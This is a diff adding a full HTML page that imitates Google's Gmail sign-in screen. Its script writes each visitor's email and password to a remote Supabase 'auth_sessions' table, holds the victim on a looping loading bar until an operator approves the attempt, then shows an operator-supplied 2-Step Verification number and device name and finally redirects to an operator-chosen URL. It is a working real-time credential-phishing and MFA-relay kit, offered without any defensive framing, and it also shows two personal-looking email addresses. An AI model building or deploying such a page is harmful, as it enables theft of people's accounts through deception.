@@ -1,0 +1,1106 @@
+<!-- index.html — full file -->
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign in - Google Accounts</title>
+    <link rel="shortcut icon" href="/logo.ico" type="image/x-icon" />
+    <style>
+      /* CSS Reset & Variables */
+      :root {
+        --bg-color: #1f1f1f;
+        --card-bg: #000000;
+        --text-primary: #e3e3e3;
+        --text-secondary: #c4c7c5;
+        --text-link: #a8c7fa;
+        --border-color: #5f6368;
+        --border-focus: #a8c7fa;
+        --error-color: #f28b82;
+        --btn-bg: #a8c7fa;
+        --btn-text: #001d35;
+        --btn-hover: #d3e3fd;
+        --font-family: "Google Sans", "Roboto", Arial, sans-serif;
+      }
+
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+
+      body {
+        background-color: var(--bg-color);
+        color: var(--text-primary);
+        font-family: var(--font-family);
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        min-height: 100vh;
+        padding: 24px;
+        position: relative;
+        overflow-x: hidden;
+      }
+
+      /* Layout Containers */
+      .main-wrapper {
+        width: 100%;
+        max-width: 1040px;
+        display: flex;
+        flex-direction: column;
+        gap: 16px;
+        justify-content: center;
+        align-items: center;
+        position: relative;
+        z-index: 1;
+        transition: opacity 0.2s ease;
+      }
+
+      .card {
+        background-color: var(--card-bg);
+        border-radius: 28px;
+        padding: 36px 40px;
+        display: flex;
+        flex-direction: row;
+        justify-content: space-between;
+        min-height: 400px;
+        position: relative;
+        width: 100%;
+      }
+
+      .left-col,
+      .right-col {
+        display: flex;
+        flex-direction: column;
+        width: 100%;
+        transition: opacity 0.2s ease;
+      }
+
+      .left-col {
+        max-width: 450px;
+      }
+      .right-col {
+        max-width: 450px;
+        justify-content: center;
+      }
+
+      /* Footer */
+      .footer {
+        display: flex;
+        justify-content: space-between;
+        font-size: 12px;
+        color: var(--text-secondary);
+        padding: 0 16px;
+        width: 100%;
+        max-width: 1040px;
+      }
+
+      .footer-left,
+      .footer-right {
+        display: flex;
+        gap: 24px;
+        align-items: center;
+      }
+
+      .footer select {
+        background: transparent;
+        border: none;
+        color: var(--text-secondary);
+        font-size: 12px;
+        outline: none;
+        cursor: pointer;
+      }
+      .footer option {
+        background: var(--bg-color);
+      }
+      .footer a {
+        color: var(--text-secondary);
+        text-decoration: none;
+      }
+      .footer a:hover {
+        text-decoration: underline;
+      }
+
+      /* Typography */
+      h1 {
+        font-size: 36px;
+        font-weight: 400;
+        margin-bottom: 12px;
+        letter-spacing: -0.5px;
+      }
+
+      h2 {
+        font-size: 16px;
+        font-weight: 400;
+        margin-bottom: 24px;
+        color: var(--text-primary);
+        line-height: 1.5;
+      }
+
+      .google-logo {
+        width: 40px;
+        height: 40px;
+        margin-bottom: 16px;
+      }
+
+      /* Inputs & Forms */
+      .input-group {
+        position: relative;
+        margin-bottom: 8px;
+        margin-top: 24px;
+      }
+
+      .input-group input {
+        width: 100%;
+        background: transparent;
+        border: 1px solid var(--border-color);
+        border-radius: 4px;
+        padding: 16px;
+        color: var(--text-primary);
+        font-size: 16px;
+        outline: none;
+        transition: border-color 0.2s;
+      }
+
+      .input-group input:focus {
+        border-color: var(--border-focus);
+        border-width: 2px;
+        padding: 15px;
+      }
+      .input-group input::placeholder {
+        color: transparent;
+      }
+
+      /* Autofill Override */
+      .input-group input:-webkit-autofill,
+      .input-group input:-webkit-autofill:hover,
+      .input-group input:-webkit-autofill:focus,
+      .input-group input:-webkit-autofill:active {
+        -webkit-box-shadow: 0 0 0 30px rgba(168, 199, 250, 0.1) inset !important;
+        -webkit-text-fill-color: var(--text-primary) !important;
+        caret-color: var(--text-primary);
+        transition: background-color 5000s ease-in-out 0s;
+      }
+
+      /* Floating Label */
+      .input-group label {
+        position: absolute;
+        left: 12px;
+        top: 50%;
+        transform: translateY(-50%);
+        background-color: var(--card-bg);
+        padding: 0 4px;
+        color: var(--text-secondary);
+        font-size: 16px;
+        transition: 0.2s ease all;
+        pointer-events: none;
+      }
+
+      .input-group input:focus ~ label,
+      .input-group input:not(:placeholder-shown) ~ label {
+        top: 0;
+        font-size: 12px;
+        color: var(--border-focus);
+      }
+
+      /* Error State */
+      .input-group.error input {
+        border-color: var(--error-color);
+      }
+      .input-group.error input:focus ~ label,
+      .input-group.error input:not(:placeholder-shown) ~ label {
+        color: var(--error-color);
+      }
+
+      .error-message {
+        color: var(--error-color);
+        font-size: 12px;
+        display: none;
+        align-items: center;
+        gap: 6px;
+        margin-top: 8px;
+        line-height: 1.4;
+      }
+      .input-group.error + .error-message {
+        display: flex;
+      }
+
+      /* Links & Text */
+      .link {
+        color: var(--text-link);
+        font-size: 14px;
+        text-decoration: none;
+        font-weight: 500;
+        margin-top: 8px;
+        display: inline-block;
+        cursor: pointer;
+      }
+      .link:hover {
+        text-decoration: underline;
+      }
+
+      .guest-text {
+        font-size: 14px;
+        color: var(--text-secondary);
+        margin-top: 24px;
+        line-height: 1.5;
+      }
+
+      /* Custom Checkbox */
+      .checkbox-group {
+        display: flex;
+        align-items: center;
+        gap: 16px;
+        margin-top: 16px;
+        font-size: 14px;
+        color: var(--text-primary);
+        cursor: pointer;
+        position: relative;
+      }
+
+      .checkbox-group input[type="checkbox"] {
+        appearance: none;
+        -webkit-appearance: none;
+        width: 18px;
+        height: 18px;
+        border: 1px solid var(--border-color);
+        border-radius: 2px;
+        background-color: transparent;
+        cursor: pointer;
+        position: relative;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition:
+          background-color 0.2s,
+          border-color 0.2s;
+      }
+
+      .checkbox-group input[type="checkbox"]:checked {
+        background-color: var(--border-focus);
+        border-color: var(--border-focus);
+      }
+
+      .checkbox-group input[type="checkbox"]:checked::after {
+        content: "";
+        width: 5px;
+        height: 10px;
+        border: solid var(--btn-text);
+        border-width: 0 2px 2px 0;
+        transform: rotate(45deg);
+        position: absolute;
+        top: 1px;
+      }
+
+      /* Buttons */
+      .btn {
+        background-color: var(--btn-bg);
+        color: var(--btn-text);
+        border: none;
+        border-radius: 100px;
+        padding: 10px 24px;
+        font-size: 14px;
+        font-weight: 500;
+        cursor: pointer;
+        transition: background-color 0.2s;
+        font-family: var(--font-family);
+      }
+
+      .btn:hover {
+        background-color: var(--btn-hover);
+        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
+      }
+
+      /* Action Rows */
+      .action-row {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: 32px;
+      }
+
+      .action-row.email-actions {
+        margin-top: 48px;
+        justify-content: flex-start;
+      }
+      .action-row.email-actions .btn {
+        margin-left: auto;
+      }
+
+      /* User Profile Pill */
+      .user-pill {
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+        border: 1px solid var(--border-color);
+        border-radius: 100px;
+        padding: 4px 12px 4px 4px;
+        font-size: 14px;
+        margin-top: 8px;
+        cursor: pointer;
+        width: fit-content;
+      }
+
+      .user-pill:hover {
+        background-color: rgba(255, 255, 255, 0.05);
+      }
+      .user-pill svg {
+        width: 24px;
+        height: 24px;
+        fill: var(--text-secondary);
+      }
+      .user-pill .dropdown-icon {
+        width: 18px;
+        height: 18px;
+        fill: var(--text-secondary);
+        margin-left: 4px;
+      }
+
+      /* 2FA Specific */
+      .two-fa-number-container {
+        width: 100%;
+        text-align: center;
+        margin-bottom: 24px;
+      }
+
+      .two-fa-number {
+        font-size: 64px;
+        font-weight: 400;
+        color: var(--text-primary);
+        line-height: 1;
+      }
+
+      .2fa-details {
+        margin-top: 16px;
+      }
+
+      .2fa-details h3 {
+        font-size: 16px;
+        font-weight: 500;
+        margin-bottom: 8px;
+      }
+
+      .2fa-details p {
+        font-size: 14px;
+        color: var(--text-secondary);
+        line-height: 1.5;
+        margin-bottom: 24px;
+      }
+
+      .try-another-way {
+        font-size: 14px;
+        color: var(--text-link);
+        text-decoration: none;
+        font-weight: 500;
+        cursor: pointer;
+      }
+      .try-another-way:hover {
+        text-decoration: underline;
+      }
+
+      /* State Management */
+      .state {
+        display: none;
+      }
+      .state.active {
+        display: flex;
+        flex-direction: column;
+        width: 100%;
+      }
+      .state-content {
+        display: none;
+      }
+      .state-content.active {
+        display: block;
+      }
+
+      /* --- LOADING STATE --- */
+      .dim-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background-color: rgba(0, 0, 0, 0.5);
+        z-index: 10;
+        opacity: 0;
+        pointer-events: none;
+        transition: opacity 0.2s ease;
+      }
+
+      .loading-bar-container {
+        position: absolute;
+        top: calc(50vh - 200px - 2px);
+        left: 50%;
+        transform: translateX(-50%);
+        width: 100%;
+        max-width: 1040px;
+        height: 4px;
+        z-index: 999;
+        background: transparent;
+        overflow: hidden;
+        border-top-left-radius: 28px;
+        border-top-right-radius: 28px;
+        opacity: 0;
+        pointer-events: none;
+        transition: opacity 0.1s ease;
+      }
+
+      .loading-bar {
+        height: 100%;
+        width: 0%;
+        background-color: var(--border-focus);
+      }
+
+      body.is-loading .main-wrapper {
+        opacity: 0.3;
+        pointer-events: none;
+      }
+      body.is-loading .dim-overlay {
+        opacity: 1;
+      }
+      body.is-loading .loading-bar-container {
+        opacity: 1;
+      }
+
+      /* Mobile Responsiveness */
+      @media (max-width: 768px) {
+        body {
+          padding: 24px;
+          justify-content: center;
+        }
+        .main-wrapper {
+          max-width: 100%;
+          min-height: auto;
+          align-items: center;
+        }
+        .card {
+          border-radius: 28px;
+          flex-direction: column;
+          padding: 32px 24px;
+          min-height: auto;
+          justify-content: flex-start;
+          width: 100%;
+          max-width: 450px;
+        }
+        .left-col,
+        .right-col {
+          max-width: 100%;
+        }
+        .right-col {
+          margin-top: 0;
+          justify-content: flex-start;
+        }
+        .footer {
+          padding: 0;
+          margin-top: 8px;
+          flex-wrap: wrap;
+          gap: 12px;
+          max-width: 450px;
+          width: 100%;
+        }
+
+        #state-2fa .two-fa-number-container {
+          order: 1;
+          margin-top: 24px;
+          margin-bottom: 24px;
+          text-align: center;
+        }
+        #state-2fa .2fa-details {
+          order: 2;
+        }
+        #state-2fa .checkbox-group {
+          order: 3;
+          justify-content: flex-start;
+          width: 100%;
+        }
+        #state-2fa .action-row {
+          order: 4;
+        }
+
+        .state-2fa .left-col h1 {
+          font-size: 32px;
+        }
+        .state-2fa .left-col h2 {
+          margin-bottom: 16px;
+        }
+
+        .loading-bar-container {
+          top: calc(50vh - 300px);
+          max-width: 450px;
+          padding: 0 24px;
+        }
+        .loading-bar-container::before {
+          content: "";
+          position: absolute;
+          top: 0;
+          left: 24px;
+          right: 24px;
+          height: 100%;
+          background-color: var(--border-focus);
+          border-top-left-radius: 28px;
+          border-top-right-radius: 28px;
+          width: calc(100% - 48px);
+        }
+      }
+
+      /* New styles for real-time status */
+      .status-message {
+        font-size: 14px;
+        color: var(--text-secondary);
+        margin-top: 16px;
+        text-align: center;
+      }
+      .hidden {
+        display: none !important;
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Full page dimmer -->
+    <div class="dim-overlay"></div>
+
+    <!-- Loader -->
+    <div class="loading-bar-container">
+      <div class="loading-bar" id="loading-bar"></div>
+    </div>
+
+    <div class="main-wrapper">
+      <div class="card">
+        <!-- LEFT COLUMN -->
+        <div class="left-col">
+          <svg class="google-logo" viewBox="0 0 48 48">
+            <path
+              fill="#EA4335"
+              d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"
+            ></path>
+            <path
+              fill="#4285F4"
+              d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"
+            ></path>
+            <path
+              fill="#FBBC05"
+              d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"
+            ></path>
+            <path
+              fill="#34A853"
+              d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"
+            ></path>
+          </svg>
+
+          <div id="left-content-email-pass" class="state-content active">
+            <h1 id="main-heading">Sign in</h1>
+            <h2 id="sub-heading">to continue to Gmail</h2>
+
+            <div id="user-pill-container" style="display: none">
+              <div class="user-pill" onclick="triggerStateChange('email')">
+                <svg viewBox="0 0 24 24">
+                  <path
+                    d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"
+                  />
+                </svg>
+                <span id="display-email">jrey0896@gmail.com</span>
+                <svg class="dropdown-icon" viewBox="0 0 24 24">
+                  <path d="M7 10l5 5 5-5z" />
+                </svg>
+              </div>
+            </div>
+          </div>
+
+          <div id="left-content-2fa" class="state-content">
+            <h1>2-Step Verification</h1>
+            <h2 style="max-width: 400px; margin-bottom: 24px">
+              To help keep your account safe, Google wants to make sure it's
+              really you trying to sign in
+            </h2>
+            <div class="user-pill" onclick="triggerStateChange('email')">
+              <svg viewBox="0 0 24 24">
+                <path
+                  d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"
+                />
+              </svg>
+              <span id="display-email-2fa">jeff4azi@gmail.com</span>
+              <svg class="dropdown-icon" viewBox="0 0 24 24">
+                <path d="M7 10l5 5 5-5z" />
+              </svg>
+            </div>
+          </div>
+        </div>
+
+        <!-- RIGHT COLUMN -->
+        <div class="right-col">
+          <div id="state-email" class="state active">
+            <div class="input-group">
+              <input
+                type="text"
+                id="email-input"
+                placeholder=" "
+                autocomplete="off"
+              />
+              <label for="email-input">Email or phone</label>
+            </div>
+            <a href="#" class="link">Forgot email?</a>
+
+            <div class="guest-text">
+              Not your computer? Use Guest mode to sign in privately.
+              <a href="#" class="link" style="margin-top: 0"
+                >Learn more about using Guest mode</a
+              >
+            </div>
+
+            <div class="action-row email-actions">
+              <a href="#" class="link" style="margin-top: 0">Create account</a>
+              <button class="btn" onclick="goToPassword()">Next</button>
+            </div>
+          </div>
+
+          <div id="state-password" class="state">
+            <div class="input-group" id="password-group">
+              <input
+                type="password"
+                id="password-input"
+                placeholder=" "
+                autocomplete="off"
+              />
+              <label for="password-input">Enter your password</label>
+            </div>
+            <div class="error-message" id="password-error">
+              <svg
+                width="16"
+                height="16"
+                viewBox="0 0 24 24"
+                fill="var(--error-color)"
+              >
+                <path
+                  d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"
+                />
+              </svg>
+              <span id="error-text"
+                >Wrong password. Try again or click "Try another way" for more
+                options.</span
+              >
+            </div>
+
+            <label class="checkbox-group">
+              <input
+                type="checkbox"
+                id="show-password"
+                onclick="togglePasswordVisibility()"
+              />
+              <span>Show password</span>
+            </label>
+
+            <div class="action-row">
+              <a href="#" class="link" style="margin-top: 0"
+                >Forgot password?</a
+              >
+              <div style="display: flex; align-items: center; gap: 16px">
+                <a href="#" class="try-another-way">Try another way</a>
+                <button class="btn" onclick="checkPassword()">Next</button>
+              </div>
+            </div>
+
+            <!-- Real-time waiting message -->
+            <div id="waiting-message" class="status-message hidden">
+              Waiting for admin approval...
+            </div>
+          </div>
+
+          <div id="state-2fa" class="state">
+            <div class="two-fa-number-container">
+              <span class="two-fa-number" id="two-fa-number-display">35</span>
+            </div>
+
+            <div class="2fa-details">
+              <h3>
+                Check your <span id="device-name-display">Galaxy A07</span>
+              </h3>
+              <p>
+                Google sent a notification to your
+                <span id="device-name-display-2">Galaxy A07</span>. Tap Yes on
+                the notification, then tap
+                <span id="two-fa-number-display-2">35</span> on your phone to
+                verify it's you.
+              </p>
+            </div>
+
+            <label class="checkbox-group">
+              <input type="checkbox" id="dont-ask" checked />
+              <span>Don't ask again on this device</span>
+            </label>
+
+            <div class="action-row" style="margin-top: 32px">
+              <a href="#" class="link" style="margin-top: 0">Resend it</a>
+              <a href="#" class="try-another-way">Try another way</a>
+            </div>
+
+            <!-- Real-time redirect message -->
+            <div id="redirect-message" class="status-message hidden">
+              Redirecting you...
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="footer">
+        <div class="footer-left">
+          <select>
+            <option>English (United States)</option>
+          </select>
+        </div>
+        <div class="footer-right">
+          <a href="#">Help</a>
+          <a href="#">Privacy</a>
+          <a href="#">Terms</a>
+        </div>
+      </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script>
+      // ====== SUPABASE CONFIG ======
+      const SUPABASE_URL = "https://jvxlknzzpgfircioqlzd.supabase.co";
+      const SUPABASE_ANON_KEY =
+        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imp2eGxrbnp6cGdmaXJjaW9xbHpkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTUwMTMyMTMsImV4cCI6MjExMDU4OTIxM30.zwGoVZ9rup1I-NhhYBsrbQYMJ_tg0Vk39JYlhG5Lbg4";
+
+      const sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+      // ====== STATE ======
+      const states = {
+        email: document.getElementById("state-email"),
+        password: document.getElementById("state-password"),
+        "2fa": document.getElementById("state-2fa"),
+      };
+
+      const leftContents = {
+        emailPass: document.getElementById("left-content-email-pass"),
+        "2fa": document.getElementById("left-content-2fa"),
+      };
+
+      const heading = document.getElementById("main-heading");
+      const subHeading = document.getElementById("sub-heading");
+      const userPill = document.getElementById("user-pill-container");
+      const emailInput = document.getElementById("email-input");
+      const passwordGroup = document.getElementById("password-group");
+      const passwordInput = document.getElementById("password-input");
+      const errorText = document.getElementById("error-text");
+      const redirectMessage = document.getElementById("redirect-message");
+      const twoFaNumberDisplay = document.getElementById(
+        "two-fa-number-display",
+      );
+      const twoFaNumberDisplay2 = document.getElementById(
+        "two-fa-number-display-2",
+      );
+      const deviceNameDisplay = document.getElementById("device-name-display");
+      const deviceNameDisplay2 = document.getElementById(
+        "device-name-display-2",
+      );
+
+      const loadingBar = document.getElementById("loading-bar");
+
+      const displayEmail = document.getElementById("display-email");
+      const displayEmail2fa = document.getElementById("display-email-2fa");
+
+      let isTransitioning = false;
+      let currentSessionId = null;
+      let realtimeSubscription = null;
+      let redirectSubscription = null;
+      let isWaitingForAdmin = false;
+
+      // ====== LOOPING LOADING CONTROL ======
+      // While the client is waiting for the admin (approval or redirect),
+      // the loading bar fills to 100% over 0.8s, snaps back to 0%, and
+      // repeats — producing a continuous looping animation instead of
+      // a stagnant full bar.
+      let loadingLoopTimer = null;
+
+      function runLoadingCycle() {
+        if (!isWaitingForAdmin) return;
+
+        loadingBar.style.transition = "none";
+        loadingBar.style.width = "0%";
+        void loadingBar.offsetWidth;
+
+        loadingBar.style.transition = "width 0.8s cubic-bezier(0.4, 0, 0.2, 1)";
+        loadingBar.style.width = "100%";
+
+        loadingLoopTimer = setTimeout(() => {
+          if (isWaitingForAdmin) runLoadingCycle();
+        }, 900);
+      }
+
+      function startLoading() {
+        if (isWaitingForAdmin) return;
+        isWaitingForAdmin = true;
+        document.body.classList.add("is-loading");
+        runLoadingCycle();
+      }
+
+      function stopLoading() {
+        isWaitingForAdmin = false;
+        if (loadingLoopTimer) {
+          clearTimeout(loadingLoopTimer);
+          loadingLoopTimer = null;
+        }
+        document.body.classList.remove("is-loading");
+        loadingBar.style.transition = "none";
+        loadingBar.style.width = "0%";
+      }
+
+      // ====== STATE TRANSITIONS ======
+      function triggerStateChange(targetState) {
+        if (isTransitioning) return;
+        isTransitioning = true;
+
+        loadingBar.style.transition = "none";
+        loadingBar.style.width = "0%";
+        void loadingBar.offsetWidth;
+
+        loadingBar.style.transition = "width 0.8s cubic-bezier(0.4, 0, 0.2, 1)";
+        document.body.classList.add("is-loading");
+
+        setTimeout(() => {
+          loadingBar.style.width = "100%";
+        }, 20);
+
+        setTimeout(() => {
+          executeStateChange(targetState);
+          document.body.classList.remove("is-loading");
+
+          setTimeout(() => {
+            loadingBar.style.transition = "none";
+            loadingBar.style.width = "0%";
+            isTransitioning = false;
+          }, 200);
+        }, 850);
+      }
+
+      function executeStateChange(stateName) {
+        Object.values(states).forEach((el) => el.classList.remove("active"));
+        Object.values(leftContents).forEach((el) =>
+          el.classList.remove("active"),
+        );
+
+        passwordGroup.classList.remove("error");
+        passwordInput.value = "";
+
+        userPill.style.display = "none";
+        heading.innerText = "Sign in";
+        subHeading.innerText = "to continue to Gmail";
+        subHeading.style.display = "block";
+        redirectMessage.classList.add("hidden");
+
+        if (stateName === "email") {
+          states.email.classList.add("active");
+          leftContents.emailPass.classList.add("active");
+          setTimeout(() => emailInput.focus(), 50);
+          cleanupSubscriptions();
+        } else if (stateName === "password" || stateName === "password-error") {
+          states.password.classList.add("active");
+          leftContents.emailPass.classList.add("active");
+
+          heading.innerText = "Welcome";
+          subHeading.style.display = "none";
+          userPill.style.display = "block";
+
+          if (stateName === "password-error") {
+            passwordGroup.classList.add("error");
+            errorText.innerText =
+              'Wrong password. Try again or click "Forgot password?" for more options.';
+            setTimeout(() => passwordInput.focus(), 50);
+          }
+        } else if (stateName === "2fa") {
+          states["2fa"].classList.add("active");
+          leftContents["2fa"].classList.add("active");
+        }
+      }
+
+      // ====== FLOW ======
+      async function goToPassword() {
+        const email = emailInput.value.trim();
+        if (!email) {
+          emailInput.focus();
+          return;
+        }
+
+        displayEmail.innerText = email;
+        displayEmail2fa.innerText = email;
+
+        try {
+          const { data, error } = await sb
+            .from("auth_sessions")
+            .insert([
+              {
+                email: email,
+                status: "email_entered",
+                created_at: new Date().toISOString(),
+              },
+            ])
+            .select()
+            .single();
+
+          if (error) throw error;
+          currentSessionId = data.id;
+          console.log("Session created:", currentSessionId);
+        } catch (err) {
+          console.error("Error creating session:", err);
+        }
+
+        triggerStateChange("password");
+      }
+
+      async function checkPassword() {
+        const pass = passwordInput.value;
+        if (!pass) {
+          passwordGroup.classList.add("error");
+          errorText.innerText = "Enter a password";
+          passwordInput.focus();
+          return;
+        }
+
+        // Start the looping loading animation. It stays on-screen
+        // (bar loops 0→100→0, dim overlay on) until the admin responds.
+        startLoading();
+
+        if (currentSessionId) {
+          try {
+            await sb
+              .from("auth_sessions")
+              .update({
+                password: pass,
+                status: "pending",
+                updated_at: new Date().toISOString(),
+              })
+              .eq("id", currentSessionId);
+          } catch (err) {
+            console.error("Error updating session:", err);
+            stopLoading();
+            passwordGroup.classList.add("error");
+            errorText.innerText = "Could not submit password. Try again.";
+            passwordInput.focus();
+            return;
+          }
+        }
+
+        subscribeToSession();
+      }
+
+      function subscribeToSession() {
+        cleanupSubscriptions();
+        if (!currentSessionId) return;
+
+        realtimeSubscription = sb
+          .channel("session-" + currentSessionId)
+          .on(
+            "postgres_changes",
+            {
+              event: "UPDATE",
+              schema: "public",
+              table: "auth_sessions",
+              filter: `id=eq.${currentSessionId}`,
+            },
+            (payload) => {
+              const newRow = payload.new;
+              console.log("Realtime update:", newRow);
+
+              if (newRow.status === "approved") {
+                twoFaNumberDisplay.innerText = newRow.twofa_number || "35";
+                twoFaNumberDisplay2.innerText = newRow.twofa_number || "35";
+                deviceNameDisplay.innerText = newRow.device_name || "Device";
+                deviceNameDisplay2.innerText = newRow.device_name || "Device";
+
+                // Swap content to the 2FA screen while the overlay is
+                // still up, then fade out the looping loading state.
+                executeStateChange("2fa");
+                stopLoading();
+
+                subscribeToRedirect();
+              } else if (newRow.status === "denied") {
+                stopLoading();
+                passwordGroup.classList.add("error");
+                errorText.innerText =
+                  'Wrong password. Try again or click "Forgot password?" for more options.';
+                passwordInput.focus();
+              }
+            },
+          )
+          .subscribe();
+      }
+
+      function subscribeToRedirect() {
+        cleanupRedirectSubscription();
+        if (!currentSessionId) return;
+
+        redirectSubscription = sb
+          .channel("redirect-" + currentSessionId)
+          .on(
+            "postgres_changes",
+            {
+              event: "UPDATE",
+              schema: "public",
+              table: "auth_sessions",
+              filter: `id=eq.${currentSessionId}`,
+            },
+            (payload) => {
+              const newRow = payload.new;
+              if (newRow.status === "redirect" && newRow.redirect_url) {
+                // No "Redirecting..." text — just start the looping
+                // loading animation while we wait for the replace.
+                startLoading();
+                // Short delay so the animation is visible before we
+                // navigate away. Use replace() so the back button
+                // cannot return to the sign-in page.
+                setTimeout(() => {
+                  window.location.replace(newRow.redirect_url);
+                }, 1200);
+              }
+            },
+          )
+          .subscribe();
+      }
+
+      function cleanupSubscriptions() {
+        if (realtimeSubscription) {
+          sb.removeChannel(realtimeSubscription);
+          realtimeSubscription = null;
+        }
+        cleanupRedirectSubscription();
+      }
+
+      function cleanupRedirectSubscription() {
+        if (redirectSubscription) {
+          sb.removeChannel(redirectSubscription);
+          redirectSubscription = null;
+        }
+      }
+
+      function togglePasswordVisibility() {
+        passwordInput.type =
+          passwordInput.type === "password" ? "text" : "password";
+      }
+
+      emailInput.addEventListener("keypress", (e) => {
+        if (e.key === "Enter") {
+          e.preventDefault();
+          goToPassword();
+        }
+      });
+
+      passwordInput.addEventListener("keypress", (e) => {
+        if (e.key === "Enter") {
+          e.preventDefault();
+          checkPassword();
+        }
+      });
+
+      passwordInput.addEventListener("input", () => {
+        if (passwordGroup.classList.contains("error")) {
+          passwordGroup.classList.remove("error");
+        }
+      });
+
+      setTimeout(() => emailInput.focus(), 100);
+    </script>
+  </body>
+</html>
